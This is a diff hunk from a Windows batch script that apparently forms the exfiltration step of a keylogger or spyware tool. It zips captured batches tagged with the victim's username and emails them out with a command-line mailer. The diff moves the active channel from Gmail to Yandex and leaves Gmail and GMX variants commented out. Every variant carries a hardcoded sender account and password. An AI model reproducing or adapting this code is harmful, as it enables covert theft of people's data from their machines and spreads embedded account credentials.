@@ -51,7 +51,12 @@ if not "%ErrorLevel%" == "1" (
 :send 
 :: Send compress file 
 echo Sending message for Batch %num% >> "%LOGFILE%"
-"%SEEXEC%" -o tls=yes -f ardamax237@gmail.com -t ardamax237@gmail.com -s smtp.gmail.com:587 -xu ardamax237@gmail.com -xp C3POalfa -u "User: %USERNAME% - Batch %num%" -m "See attachment" -a "%READYDIR%\%num%.zip" -l "%APPLOC%\se-traffic.log"
+:: GMail
+:: "%SEEXEC%" -o tls=yes -f ardamax237@gmail.com -t ardamax237@gmail.com -s smtp.gmail.com:587 -xu ardamax237@gmail.com -xp C3POalfa -u "User: %USERNAME% - Batch %num%" -m "See attachment" -a "%READYDIR%\%num%.zip" -l "%APPLOC%\se-traffic.log"
+:: YANDEX
+"%SEEXEC%" -o tls=auto -f ardamax237@yandex.com -t ardamax237@yandex.com -s smtp.yandex.com -xu ardamax237 -xp C3POalfa -u "User: %USERNAME% - Batch %num%" -m "See attachment" -a "%READYDIR%\%num%.zip" -l "%APPLOC%\se-traffic.log"
+:: GMX
+:: "%SEEXEC%" -o tls=yes -f ardamax237@gmx.com -t ardamax237@gmx.com -s mail.gmx.com:587 -xu ardamax237@gmx.com -xp C3POalfa -u "User: %USERNAME% - Batch %num%" -m "See attachment" -a "%READYDIR%\%num%.zip" -l "%APPLOC%\se-traffic.log"
 if not "%ErrorLevel%" == "1" (
 	goto clean
 )
